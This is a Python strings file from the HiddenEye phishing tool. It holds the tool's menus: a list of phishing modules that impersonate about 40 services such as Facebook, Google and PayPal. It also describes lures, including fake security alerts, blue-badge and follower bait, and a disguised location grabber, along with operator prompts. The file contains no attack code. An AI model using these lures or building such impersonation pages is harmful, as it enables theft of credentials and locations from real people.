#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
# Contains all ActionManager/main_runner.py translation strings
import Defs.ThemeManager.theme as theme
from Defs.LocalizationManager.localization import _

default_palette = theme.default_palette


def check_version():  # WILL BE MOVED FROM HERE
    with open("version.txt") as f:  # THIS WILL BE MOVED TOO
        # ver_current = f.read()         # DONT REMOVE THESE COMMENTS
        # version = ver_current.strip()  # TO-DO
        return f.read().strip()


version = check_version()

lang_start_main_menu = {
    "version_by_darksec": _(
        "                                              {2}[{0}v {3}{2}]{0} BY:DARKSEC{1}"
    ).format(default_palette[4], default_palette[2], default_palette[0], version),
    "short_description": _(
        "{1}[{0} Modern Phishing Tool With Advanced Functionality {1}]"
    ).format(default_palette[2], default_palette[0]),
    "features_summary": _(
        "{1}[{0} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {1}]"
    ).format(default_palette[2], default_palette[0]),
    "down_line": "{0}________________________________________________________________________________".format(
        default_palette[0]
    ),
    "attack_vector_message": _(
        "------------------------\nSELECT ANY ATTACK VECTOR:\n------------------------"
    ),
    "phishing_modules_header": _("\n{0}PHISHING-MODULES:").format(default_palette[0]),
    "phishing_modules_list": [
        [
            "{0}[{1}01{0}]{1} Facebook",
            "{0}[{1}13{0}]{1} Steam",
            "{0}[{1}25{0}]{1} Badoo",
            "{0}[{1}37{0}]{1} PlayStation",
        ],
        [
            "{0}[{1}02{0}]{1} Google",
            "{0}[{1}14{0}]{1} VK",
            "{0}[{1}26{0}]{1} CryptoCurrency",
            "{0}[{1}38{0}]{1} Xbox",
        ],
        [
            "{0}[{1}03{0}]{1} LinkedIn",
            "{0}[{1}15{0}]{1} iCloud",
            "{0}[{1}27{0}]{1} DevianArt",
            "{0}[{1}39{0}]{1} CUSTOM(1)",
        ],
        [
            "{0}[{1}04{0}]{1} GitHub",
            "{0}[{1}16{0}]{1} GitLab",
            "{0}[{1}28{0}]{1} DropBox",
            "{0}[{1}40{0}]{1} CUSTOM(2)",
        ],
        [
            "{0}[{1}05{0}]{1} StackOverflow",
            "{0}[{1}17{0}]{1} Netflix",
            "{0}[{1}29{0}]{1} eBay",
        ],
        [
            "{0}[{1}06{0}]{1} WordPress",
            "{0}[{1}18{0}]{1} Origin",
            "{0}[{1}30{0}]{1} MySpace",
        ],
        [
            "{0}[{1}07{0}]{1} Twitter",
            "{0}[{1}19{0}]{1} Pinterest",
            "{0}[{1}31{0}]{1} PayPal",
        ],
        [
            "{0}[{1}08{0}]{1} Instagram",
            "{0}[{1}20{0}]{1} ProtonMail",
            "{0}[{1}32{0}]{1} Shopify",
        ],
        [
            "{0}[{1}09{0}]{1} Snapchat",
            "{0}[{1}21{0}]{1} Spotify",
            "{0}[{1}33{0}]{1} Verizon",
        ],
        ["{0}[{1}10{0}]{1} Yahoo", "{0}[{1}22{0}]{1} Quora", "{0}[{1}34{0}]{1} Yandex"],
        [
            "{0}[{1}11{0}]{1} Twitch",
            "{0}[{1}23{0}]{1} PornHub",
            "{0}[{1}35{0}]{1} Reddit",
        ],
        [
            "{0}[{1}12{0}]{1} Microsoft",
            "{0}[{1}24{0}]{1} Adobe",
            "{0}[{1}36{0}]{1} Subito.it",
        ],
    ],
    "additional_modules": _("\n{0}ADDITIONAL-TOOLS:").format(default_palette[0]),
    "additional_modules_list": [[_("{0}[{1}0A{0}]{1} Get Target Location")]],
    "operation_mode": _("\nOperation mode:\n"),
    "facebook_operation_modes": [
        [
            _("{0}[{1}1{0}]{1} Standard Page Phishing"),
            _("{0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode)"),
        ],
        [
            _(
                "{0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)"
            ),
            _(
                "{0}[{1}4{0}]{1} Facebook Phishing-Messenger Credentials(messenger_mode)"
            ),
        ],
    ],
    "google_operation_modes": [
        [
            _("{0}[{1}1{0}]{1} Standard Page Phishing"),
            _("{0}[{1}3{0}]{1} New Google Web"),
        ],
        [_("{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)")],
    ],
    "instagram_operation_modes": [
        [
            _("{0}[{1}1{0}]{1} Standard Instagram Web Page Phishing"),
            _(
                "{0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge)"
            ),
        ],
        [
            _("{0}[{1}2{0}]{1} Instagram Autoliker Phishing (To Lure The Users)"),
            _("{0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers)"),
        ],
        [
            _(
                "{0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)"
            )
        ],
    ],
    "VK_operation_modes": [
        [
            _("{0}[{1}1{0}]{1} Standard VK Web Page Phishing"),
            _("{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)"),
        ]
    ],
    "reddit_operation_modes": [
        [_("{0}[{1}1{0}]{1} New reddit page"), _("{0}[{1}2{0}]{1} Old reddit page")]
    ],
    "additional_module_location_operation_modes": [
        [
            _("{0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)"),
            _(
                "{0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE)"
            ),
        ]
    ],
}
lang_start_phishing_page = {
    "custom_folder_directory": _(
        "\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/{page}"
    ).format(default_palette[0], default_palette[4], page="page"),
    "manual_reading_suggestion": _(
        "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/{page}]"
    ).format(default_palette[0], default_palette[4], page="page"),
    "press_enter_to_contunue_if_setup_correctly": _(
        "\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue."
    ).format(default_palette[0], default_palette[4]),
    "copying_your_files": _(
        "\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder..."
    ).format(default_palette[0], default_palette[4]),
    "https_suggestion": _(
        "\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n"
    ).format(default_palette[0], default_palette[4]),
    "gdrive_suggestion": _(
        "{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked."
    ).format(default_palette[0], default_palette[4]),
}

lang_enter_custom_redirecting_url = {
    "enter_redirecting_url_header": _(
        "{0}\n-------------------------------\n{1}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "enter_redirecting_url_prompt": _(
        "\n{0}[{1}*{0}]Insert a custom redirect url:"
    ).format(default_palette[0], default_palette[4]),
    "redirect_here": _("\n{0}REDIRECT HERE>>> {1}").format(
        default_palette[0], default_palette[2]
    ),
}

#
#
